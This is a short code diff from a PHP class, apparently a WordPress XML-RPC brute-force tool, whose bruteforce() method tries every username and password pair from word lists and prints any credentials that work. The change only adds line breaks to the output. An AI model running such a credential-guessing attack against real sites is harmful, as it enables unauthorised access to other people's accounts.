@@ -34,19 +34,19 @@ class XMLRPC_WP {
 	}
 
 	function bruteforce() {
-		echo("[~] Running..");
+		echo("[~] Running..\r\n");
 		$flag = False;
 		foreach($this->users_file as $user) {
 			foreach($this->passwords_file as $password) {
 				if($this->login($user, $password) == True) {
 					$flag = True;
-					echo("[+] Hacked!\r\nUsername: " . $user . "\r\nPassword: " . $password);
-					echo("[~] Done!\r\ns");		
+					echo("[+] Hacked!\r\nUsername: " . $user . "\r\nPassword: " . $password . "\r\n");
+					echo("[~] Done!\r\n");		
 				}
 			}
 		}
 		if(!$flag) {
-			echo("[-] Login credentials not found.");
+			echo("[-] Login credentials not found.\r\n");
 		}
 	}
 }
